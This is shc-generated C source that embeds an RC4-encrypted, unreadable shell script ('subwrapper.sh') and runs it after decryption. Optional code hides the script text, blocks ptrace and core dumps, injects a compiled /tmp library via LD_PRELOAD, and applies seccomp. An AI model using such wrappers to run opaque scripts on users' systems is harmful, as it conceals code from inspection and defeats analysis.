#if 0
	shc Version 4.0.3, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	shc -f subwrapper.sh -o bin/subwrapper 
#endif

static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[1]))
	"\277\075\335\336\247\320\030\271\352\124\321\340\214\157\036\266"
	"\220\174\114\027\360"
#define      chk2_z	19
#define      chk2	((&data[24]))
	"\122\021\236\104\014\142\330\367\202\346\050\115\263\236\247\347"
	"\202\016\331\372\255\134\347\000\153"
#define      msg2_z	19
#define      msg2	((&data[46]))
	"\307\222\302\100\015\356\333\044\022\105\352\057\132\263\060\356"
	"\022\315\355\241"
#define      inlo_z	3
#define      inlo	((&data[66]))
	"\123\256\324"
#define      text_z	1912
#define      text	((&data[77]))
	"\343\034\112\210\325\315\213\013\237\055\307\264\176\015\162\373"
	"\250\053\341\371\223\037\347\032\260\354\312\250\025\201\072\007"
	"\063\244\264\235\133\102\223\102\226\022\266\065\235\065\124\063"
	"\277\123\033\313\076\073\274\122\361\325\323\143\217\160\355\051"
	"\231\257\300\361\230\353\346\203\103\361\064\112\034\213\023\377"
	"\377\000\256\011\331\230\173\015\144\124\047\051\211\337\236\201"
	"\014\107\045\220\157\326\042\246\226\177\126\240\336\214\204\103"
	"\144\023\272\233\371\071\355\161\162\164\307\232\343\344\244\044"
	"\140\303\055\216\177\016\070\365\010\041\351\261\110\102\260\336"
	"\036\147\124\321\244\245\324\314\224\227\204\077\167\167\246\146"
	"\052\231\322\273\141\065\145\315\266\157\243\127\074\150\151\174"
	"\364\352\253\124\100\346\116\037\037\341\207\161\374\142\066\241"
	"\221\370\120\017\302\270\230\225\303\325\140\231\254\346\247\375"
	"\235\164\360\221\357\254\105\373\324\103\264\326\253\264\354\122"
	"\367\014\354\257\106\201\271\011\047\253\170\274\152\027\147\203"
	"\006\125\143\150\166\251\306\067\240\264\235\262\066\102\227\012"
	"\134\301\075\327\166\230\233\343\060\115\107\332\323\060\162\356"
	"\066\001\075\031\067\145\105\275\326\305\017\012\233\037\306\260"
	"\262\276\216\042\111\255\116\314\042\123\257\223\056\331\210\103"
	"\343\105\137\136\033\235\156\334\352\370\176\377\137\032\303\131"
	"\222\066\270\176\041\256\330\317\334\112\026\100\006\101\055\035"
	"\311\264\007\135\366\051\107\007\365\337\236\043\243\027\003\116"
	"\033\057\012\165\210\274\077\353\312\224\242\001\030\214\272\354"
	"\316\345\340\123\245\125\252\332\360\237\304\242\007\107\340\302"
	"\333\305\005\217\034\253\365\062\144\105\365\263\320\106\372\174"
	"\304\247\165\107\052\021\306\135\207\241\264\356\270\270\061\255"
	"\237\241\026\376\127\253\116\256\364\123\125\273\347\031\031\300"
	"\334\077\256\012\000\166\216\077\113\345\377\062\177\245\143\205"
	"\146\033\327\351\147\145\070\073\335\200\246\070\225\307\354\252"
	"\161\063\112\303\305\320\344\045\027\045\150\222\370\116\163\011"
	"\121\007\254\344\007\072\161\327\037\176\262\054\052\104\166\146"
	"\262\342\227\222\017\366\006\306\070\341\344\137\247\271\266\215"
	"\026\172\032\102\166\113\202\065\075\317\131\347\143\137\103\256"
	"\206\141\372\137\114\343\360\100\212\347\072\230\123\030\004\250"
	"\112\254\133\163\023\135\144\331\326\002\011\236\132\362\041\272"
	"\320\367\344\344\132\014\003\053\352\042\270\121\107\054\104\106"
	"\015\053\012\227\157\326\202\065\366\343\123\263\266\066\150\230"
	"\175\125\244\242\224\326\263\102\177\041\067\310\247\241\355\254"
	"\227\360\340\050\232\210\066\067\062\013\224\111\132\223\165\270"
	"\271\163\233\030\236\115\351\066\210\015\331\060\030\231\205\162"
	"\125\202\074\066\346\321\024\132\032\107\367\350\163\247\065\340"
	"\206\341\011\234\262\363\030\032\022\327\016\316\342\331\200\254"
	"\360\143\226\027\130\267\032\250\310\330\354\366\371\147\344\062"
	"\263\225\064\040\031\353\326\006\050\246\176\375\230\347\145\271"
	"\262\076\147\232\375\065\150\372\223\074\377\001\373\052\110\375"
	"\107\111\011\371\206\362\271\150\031\255\000\135\033\313\052\211"
	"\273\035\344\134\056\024\314\072\122\240\066\042\207\331\204\322"
	"\305\131\002\036\001\146\366\357\202\053\324\251\232\033\333\363"
	"\250\226\131\035\073\276\040\041\037\120\172\371\213\340\337\213"
	"\133\361\235\067\003\147\025\133\121\044\273\241\001\322\023\172"
	"\103\265\106\310\057\044\071\151\012\135\350\350\071\106\324\273"
	"\246\206\137\047\252\376\154\022\036\312\313\101\332\245\304\163"
	"\302\351\355\164\275\163\260\035\205\163\134\130\376\324\274\051"
	"\251\304\374\174\252\245\141\303\314\100\073\043\170\065\334\135"
	"\145\043\146\206\011\110\241\012\257\117\314\067\162\217\033\005"
	"\246\002\070\076\134\233\057\163\224\041\344\272\340\310\160\357"
	"\370\245\316\057\226\170\144\004\265\267\324\257\326\257\351\020"
	"\065\156\366\351\225\233\340\060\005\215\140\023\052\000\335\032"
	"\205\265\100\357\234\172\256\310\276\031\262\174\036\224\365\203"
	"\346\163\210\031\210\012\335\044\247\332\103\114\224\022\325\012"
	"\376\074\270\314\123\130\252\130\141\207\246\152\222\201\174\272"
	"\260\171\057\125\321\144\176\370\307\177\132\307\165\254\217\136"
	"\350\375\007\314\013\015\266\150\325\251\325\177\242\264\210\344"
	"\157\201\002\234\264\334\222\300\203\216\327\210\171\362\322\006"
	"\275\221\144\225\316\237\166\062\055\055\054\174\011\125\031\116"
	"\363\370\004\263\363\246\270\350\304\332\015\216\254\065\303\365"
	"\365\224\201\051\000\166\225\200\002\340\237\217\256\320\110\201"
	"\366\171\020\336\015\212\324\117\157\063\010\273\005\373\147\052"
	"\365\060\262\325\164\046\056\222\356\226\035\150\366\133\063\145"
	"\313\361\077\302\211\177\171\035\270\026\316\103\046\345\022\040"
	"\010\234\142\002\121\176\200\031\146\245\277\034\332\046\052\277"
	"\133\006\336\226\317\115\072\241\232\311\172\101\327\120\141\047"
	"\372\362\224\042\260\375\057\160\035\063\110\141\356\125\246\107"
	"\334\016\117\007\337\143\361\250\376\227\024\321\111\172\132\162"
	"\050\141\073\102\024\152\001\142\112\345\263\201\144\357\171\066"
	"\202\232\141\253\352\255\272\066\012\252\022\025\040\310\345\136"
	"\136\104\216\216\114\267\042\274\243\076\000\003\230\177\012\255"
	"\055\355\053\056\366\106\064\021\312\361\253\342\370\130\025\226"
	"\151\376\021\223\114\020\157\001\264\046\150\071\303\243\205\365"
	"\353\003\026\155\042\022\354\036\247\320\302\156\317\272\337\265"
	"\116\262\347\354\326\275\064\112\126\340\261\063\077\121\323\111"
	"\123\044\054\125\157\321\201\375\105\170\307\054\113\060\125\151"
	"\131\104\374\273\272\157\221\345\327\355\042\107\335\323\014\157"
	"\201\372\026\345\373\257\167\247\266\164\027\146\127\154\205\215"
	"\202\344\041\373\236\075\000\156\352\267\046\066\146\115\136\252"
	"\032\155\310\356\372\167\302\377\205\300\162\110\042\230\140\254"
	"\014\242\303\345\360\035\127\356\171\013\375\342\320\101\150\115"
	"\224\113\323\053\015\107\343\345\142\131\045\300\262\115\355\040"
	"\053\243\126\274\262\001\137\164\021\305\264\345\272\362\136\134"
	"\137\015\060\332\054\171\034\361\122\072\157\166\304\160\354\263"
	"\156\217\255\211\315\122\242\202\070\135\117\065\274\204\365\264"
	"\102\224\236\176\121\167\016\246\307\205\216\370\317\374\357\214"
	"\134\077\371\075\377\162\121\346\175\317\322\316\334\357\222\310"
	"\033\362\167\123\214\076\272\251\144\153\241\354\302\272\177\310"
	"\166\266\205\130\213\330\202\153\126\126\033\163\016\066\124\356"
	"\314\244\055\240\306\303\356\375\236\207\327\136\112\210\363\000"
	"\100\171\047\204\061\005\055\033\316\265\315\342\121\242\325\031"
	"\134\077\016\154\265\212\071\140\002\155\300\060\376\265\007\313"
	"\122\265\261\244\213\155\151\376\013\370\331\201\221\001\072\016"
	"\164\017\046\305\145\307\227\323\020\125\144\262\022\354\103\177"
	"\302\140\203\153\025\000\354\172\365\255\202\227\351\213\317\223"
	"\220\140\006\320\005\044\006\302\010\300\240\323\372\302\315\332"
	"\006\145\125\066\167\311\076\023\123\277\016\225\005\203\167\117"
	"\202\263\127\254\060\172\014\204\350\051\046\012\144\157\201\255"
	"\066\256\055\347\242\244\037\347\176\254\026\216\157\004\073\265"
	"\234\010\043\037\034\203\026\005\356\273\332\330\265\365\347\051"
	"\135\075\232\342\100\144\265\103\147\154\260\262\106\123\050\105"
	"\004\114\313\107\375\054\017\256\262\065\355\000\266\331\237\210"
	"\344\253\017\115\214\356\375\213\172\113\305\136\334\134\001\364"
	"\246\141\010\013\070\070\000\237\231\031\332\221\240\113\106\341"
	"\016\277\126\115\162\271\135\264\317\216\276\056\135\135\002\360"
	"\227\371\103\244\004\277\025\237\350\050\175\051\253\365\272\022"
	"\234\342\230\126\043\372\111\025\265\267\212\005\123\063\346\242"
	"\053\106\343\327\365\124\172\062\262\205\336\107\340\011\121\132"
	"\106\227\371\255\043\215\076\075\124\374\017\062\045\236\010\037"
	"\234\334\252\164\363\320\057\215\132\264\156\023\120\014\322\320"
	"\114\116\122\346\163\055\247\161\002\166\037\161\107\250\275\072"
	"\023\005\255\354\345\345\176\335\233\255\215\311\135\202\365\375"
	"\103\056\005\041\076\325\303\060\274\335\277\236\306\156\340\232"
	"\012\257\105\051\132\220\020\021\221\221\336\373\170\154\155\100"
	"\254\075\027\377\115\324\264\175\301\132\212\166\364\075\315\307"
	"\114\170\105\350\120\356\044\066\271\374\212\072\200\120\377\376"
	"\141\013\043\256\014\126\121\165\370\210\030\254\340\373\203\147"
	"\324\004\215\136\357\373\076\146\154\141\130\322\171\233\024\247"
	"\215\122\222\253\276\225\055\252\107\002\274\361\057\367\206\145"
	"\221\075\247\033\367\241\133\127\245\027\023\032\213\102\103\143"
	"\216\203\125\340\006\221\110\215\240\054\021\300\343\064\303\017"
	"\011\040\364\222\156\374\157\010\177\177\324\341\273\054\122\076"
	"\326\210\350\007\042\342\122\071\307\224\350\257\172\260\141\337"
	"\170\111\234\061\310\245\014\072\140\142\331\005\140\212\006\061"
	"\145\117\172\153\010\040\237\216\177\114\067\347\075\256\277\130"
	"\340\046\246\347\066\371\377\136\143\062\012\130\177\232\217\112"
	"\176\177\332\340\044\136\334\226\022\334\103\211\155\035\270\312"
	"\217\221\214\022\305\166\275\371\330\033\374\261\116\005\250\247"
	"\326\206\223\242\252\031\172\006\223\337\331\043\146\136\225\246"
	"\126\335\114\224\317\370\272\046\266\360\277\370\071\314\310\275"
	"\111\306\164\063\044\076\136\025\227\030\266\115\315\223\067\054"
	"\325\017\351\020\163\077\337\216\031\120\116\035\041\131\161\157"
	"\222\130\274\235\170\054\256\113\032\270\034\347\027\342\024\354"
	"\232\173\265\047\122\356\370\324\236\063\357\046\247\153\017\264"
	"\217\011\147\011\005\241\121\352\027\251\044\230\314\214\013\252"
	"\316\000\123\045\216\247\047\225\254\273\351\203\171\155\371"
#define      lsto_z	1
#define      lsto	((&data[2340]))
	"\024"
#define      msg1_z	65
#define      msg1	((&data[2352]))
	"\063\067\344\364\343\374\036\300\052\104\277\151\144\217\172\131"
	"\246\131\026\034\227\362\151\316\012\204\024\001\002\254\143\013"
	"\203\377\240\242\122\121\216\120\364\056\250\057\350\112\127\337"
	"\330\136\305\034\126\123\305\043\254\023\212\031\071\272\235\365"
	"\154\215\064\151\164\176\011\352\145\311\051\365\105"
#define      pswd_z	256
#define      pswd	((&data[2424]))
	"\240\227\110\160\234\012\224\141\372\232\010\150\266\267\341\160"
	"\232\171\236\306\257\275\351\010\351\105\046\163\347\227\205\215"
	"\154\021\335\216\144\304\013\351\025\017\103\076\267\010\025\007"
	"\350\145\056\003\355\221\235\020\177\344\232\154\246\152\107\367"
	"\272\243\135\013\234\310\257\037\101\303\010\363\326\365\103\203"
	"\154\217\062\203\021\126\222\300\001\221\240\017\103\071\033\065"
	"\207\364\125\353\071\353\335\060\227\100\037\167\116\001\343\162"
	"\363\271\111\255\143\307\351\066\310\000\372\355\345\113\026\233"
	"\336\206\317\002\140\376\041\144\362\301\176\225\042\046\345\014"
	"\051\312\147\367\141\130\140\334\245\320\302\365\014\113\074\266"
	"\226\161\226\275\131\060\170\311\306\147\363\131\053\357\254\071"
	"\001\115\337\143\164\014\301\104\231\242\152\110\141\135\211\346"
	"\007\147\132\015\257\273\325\011\006\014\033\336\217\155\077\340"
	"\120\027\077\241\145\062\300\021\066\277\334\042\272\275\166\114"
	"\275\363\147\041\165\022\207\017\253\036\120\255\051\315\122\166"
	"\222\115\034\212\202\362\024\314\271\101\163\245\356\176\361\217"
	"\067\264\240\037\130\155\370\236\166\132\252\334\127\245\066\365"
	"\072\103\260\367\221\042\335\237\154\062\162\203\374\177\215\025"
	"\277\234\333\215\122\147\234\365\051\054\266\043\344\353\100\101"
	"\131\227\013\123\361\251\045\356\366\033\223\000\030\262\075\337"
	"\245\267"
#define      date_z	1
#define      date	((&data[2740]))
	"\357"
#define      xecc_z	15
#define      xecc	((&data[2741]))
	"\311\073\156\026\224\214\010\264\256\054\076\377\361\074\172\374"
	"\237"
#define      shll_z	10
#define      shll	((&data[2758]))
	"\054\231\056\272\216\321\334\360\240\361\212\134"
#define      tst1_z	22
#define      tst1	((&data[2775]))
	"\270\343\176\146\231\256\115\365\273\273\337\246\025\220\371\045"
	"\214\174\306\170\143\062\264\367\130\117\230\212\234\140"
#define      chk1_z	22
#define      chk1	((&data[2800]))
	"\024\265\164\003\246\045\006\346\025\127\265\236\174\255\036\155"
	"\073\205\227\227\034\311\050\063"
#define      opts_z	1
#define      opts	((&data[2824]))
	"\340"
#define      rlax_z	1
#define      rlax	((&data[2825]))
	"\051"/* End of data[] */;
#define      hide_z	4096
#define SETUID 0	/* Define as 1 to call setuid(0) at start of script */
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define HARDENING	0	/* Define as 1 to disable ptrace/dump the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

#if HARDENING
static const char * shc_x[] = {
"/*",
" * Copyright 2019 - Intika <intika@librefox.org>",
" * Replace ******** with secret read from fd 21",
" * Also change arguments location of sub commands (sh script commands)",
" * gcc -Wall -fpic -shared -o shc_secret.so shc_secret.c -ldl",
" */",
"",
"#define _GNU_SOURCE /* needed to get RTLD_NEXT defined in dlfcn.h */",
"#define PLACEHOLDER \"********\"",
"#include <dlfcn.h>",
"#include <stdlib.h>",
"#include <string.h>",
"#include <unistd.h>",
"#include <stdio.h>",
"#include <signal.h>",
"",
"static char secret[128000]; //max size",
"typedef int (*pfi)(int, char **, char **);",
"static pfi real_main;",
"",
"// copy argv to new location",
"char **copyargs(int argc, char** argv){",
"    char **newargv = malloc((argc+1)*sizeof(*argv));",
"    char *from,*to;",
"    int i,len;",
"",
"    for(i = 0; i<argc; i++){",
"        from = argv[i];",
"        len = strlen(from)+1;",
"        to = malloc(len);",
"        memcpy(to,from,len);",
"        // zap old argv space",
"        memset(from,'\\0',len);",
"        newargv[i] = to;",
"        argv[i] = 0;",
"    }",
"    newargv[argc] = 0;",
"    return newargv;",
"}",
"",
"static int mymain(int argc, char** argv, char** env) {",
"    //fprintf(stderr, \"Inject main argc = %d\\n\", argc);",
"    return real_main(argc, copyargs(argc,argv), env);",
"}",
"",
"int __libc_start_main(int (*main) (int, char**, char**),",
"                      int argc,",
"                      char **argv,",
"                      void (*init) (void),",
"                      void (*fini)(void),",
"                      void (*rtld_fini)(void),",
"                      void (*stack_end)){",
"    static int (*real___libc_start_main)() = NULL;",
"    int n;",
"",
"    if (!real___libc_start_main) {",
"        real___libc_start_main = dlsym(RTLD_NEXT, \"__libc_start_main\");",
"        if (!real___libc_start_main) abort();",
"    }",
"",
"    n = read(21, secret, sizeof(secret));",
"    if (n > 0) {",
"      int i;",
"",
"    if (secret[n - 1] == '\\n') secret[--n] = '\\0';",
"    for (i = 1; i < argc; i++)",
"        if (strcmp(argv[i], PLACEHOLDER) == 0)",
"          argv[i] = secret;",
"    }",
"",
"    real_main = main;",
"",
"    return real___libc_start_main(mymain, argc, argv, init, fini, rtld_fini, stack_end);",
"}",
"",
0};
#endif /* HARDENING */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

#if HARDENING

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/prctl.h>
#define PR_SET_PTRACER 0x59616d61

/* Seccomp Sandboxing Init */
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>

#define ArchField offsetof(struct seccomp_data, arch)

#define Allow(syscall) \
    BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, SYS_##syscall, 0, 1), \
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW)

struct sock_filter filter[] = {
    /* validate arch */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, ArchField),
    BPF_JUMP( BPF_JMP+BPF_JEQ+BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),

    /* load syscall */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, nr)),

    /* list of allowed syscalls */
    Allow(exit_group),  /* exits a process */
    Allow(brk),         /* for malloc(), inside libc */
    Allow(mmap),        /* also for malloc() */
    Allow(munmap),      /* for free(), inside libc */

    /* and if we don't match above, die */
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
};
struct sock_fprog filterprog = {
    .len = sizeof(filter)/sizeof(filter[0]),
    .filter = filter
};

/* Seccomp Sandboxing - Set up the restricted environment */
void seccomp_hardening() {
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        perror("Could not start seccomp:");
        exit(1);
    }
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filterprog) == -1) {
        perror("Could not start seccomp:");
        exit(1);
    }
} 
/* End Seccomp Sandboxing Init */

void shc_x_file() {
    FILE *fp;
    int line = 0;

    if ((fp = fopen("/tmp/shc_x.c", "w")) == NULL ) {exit(1); exit(1);}
    for (line = 0; shc_x[line]; line++)	fprintf(fp, "%s\n", shc_x[line]);
    fflush(fp);fclose(fp);
}

int make() {
	char * cc, * cflags, * ldflags;
    char cmd[4096];

	cc = getenv("CC");
	if (!cc) cc = "cc";

	sprintf(cmd, "%s %s -o %s %s", cc, "-Wall -fpic -shared", "/tmp/shc_x.so", "/tmp/shc_x.c -ldl");
	if (system(cmd)) {remove("/tmp/shc_x.c"); return -1;}
	remove("/tmp/shc_x.c"); return 0;
}

void arc4_hardrun(void * str, int len) {
    //Decode locally
    char tmp2[len];
    char tmp3[len+1024];
    memcpy(tmp2, str, len);

	unsigned char tmp, * ptr = (unsigned char *)tmp2;
    int lentmp = len;
    int pid, status;
    pid = fork();

    shc_x_file();
    if (make()) {exit(1);}

    setenv("LD_PRELOAD","/tmp/shc_x.so",1);

    if(pid==0) {

        //Start tracing to protect from dump & trace
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
            kill(getpid(), SIGKILL);
            _exit(1);
        }

        //Decode Bash
        while (len > 0) {
            indx++;
            tmp = stte[indx];
            jndx += tmp;
            stte[indx] = stte[jndx];
            stte[jndx] = tmp;
            tmp += stte[indx];
            *ptr ^= stte[tmp];
            ptr++;
            len--;
        }

        //Do the magic
        sprintf(tmp3, "%s %s", "'********' 21<<<", tmp2);

        //Exec bash script //fork execl with 'sh -c'
        system(tmp2);

        //Empty script variable
        memcpy(tmp2, str, lentmp);

        //Clean temp
        remove("/tmp/shc_x.so");

        //Sinal to detach ptrace
        ptrace(PTRACE_DETACH, 0, 0, 0);
        exit(0);
    }
    else {wait(&status);}

    /* Seccomp Sandboxing - Start */
    seccomp_hardening();

    exit(0);
}
#endif /* HARDENING */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if HARDENING

static void gets_process_name(const pid_t pid, char * name) {
	char procfile[BUFSIZ];
	sprintf(procfile, "/proc/%d/cmdline", pid);
	FILE* f = fopen(procfile, "r");
	if (f) {
		size_t size;
		size = fread(name, sizeof (char), sizeof (procfile), f);
		if (size > 0) {
			if ('\n' == name[size - 1])
				name[size - 1] = '\0';
		}
		fclose(f);
	}
}

void hardening() {
    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_PTRACER, -1);

    int pid = getppid();
    char name[256] = {0};
    gets_process_name(pid, name);

    if (   (strcmp(name, "bash") != 0) 
        && (strcmp(name, "/bin/bash") != 0) 
        && (strcmp(name, "sh") != 0) 
        && (strcmp(name, "/bin/sh") != 0) 
        && (strcmp(name, "sudo") != 0) 
        && (strcmp(name, "/bin/sudo") != 0) 
        && (strcmp(name, "/usr/bin/sudo") != 0)
        && (strcmp(name, "gksudo") != 0) 
        && (strcmp(name, "/bin/gksudo") != 0) 
        && (strcmp(name, "/usr/bin/gksudo") != 0) 
        && (strcmp(name, "kdesu") != 0) 
        && (strcmp(name, "/bin/kdesu") != 0) 
        && (strcmp(name, "/usr/bin/kdesu") != 0) 
       )
    {
        printf("Operation not permitted\n");
        kill(getpid(), SIGKILL);
        exit(1);
    }
}

#endif /* HARDENING */

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PT_ATTACHEXC) /* New replacement for PT_ATTACH */
   #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
       #define PT_ATTACHEXC	PT_ATTACH
   #elif defined(PTRACE_ATTACH)
       #define PT_ATTACHEXC PTRACE_ATTACH
   #endif
#endif

void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PT_ATTACHEXC, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
#if HARDENING
	    arc4_hardrun(text, text_z);
	    exit(0);
       /* Seccomp Sandboxing - Start */
       seccomp_hardening();
#endif
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if SETUID
   setuid(0);
#endif
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if HARDENING
	hardening();
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
